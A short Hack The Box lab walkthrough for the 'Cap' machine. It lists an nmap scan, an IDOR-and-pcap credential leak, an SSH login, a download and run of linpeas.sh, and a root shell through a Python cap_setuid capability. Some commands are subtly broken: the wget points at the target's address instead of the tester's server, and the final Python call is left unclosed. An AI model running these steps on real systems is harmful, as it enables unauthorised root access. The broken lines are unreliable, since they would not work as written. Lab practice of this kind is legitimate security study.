# Hack The Box

<details>
  <summary>
    
   ### CAP
  </summary>
`nmap -sC -sV 10.10.10.245`
```
21/tcp    open     ftp         vsftpd 3.0.3
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http        gunicorn
```
From the website we got a idor vuln and from the pcap file we got the user name and password

`ssh nathan@10.10.10.245`

`python3 -m http.server 8080`
`wget http://10.10.10.245:8080/linpeas.sh`

`./linpeas.sh`
`/setuid`

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
```
import os
os.setuid(0)
os.system("/bin/bash"

</details>
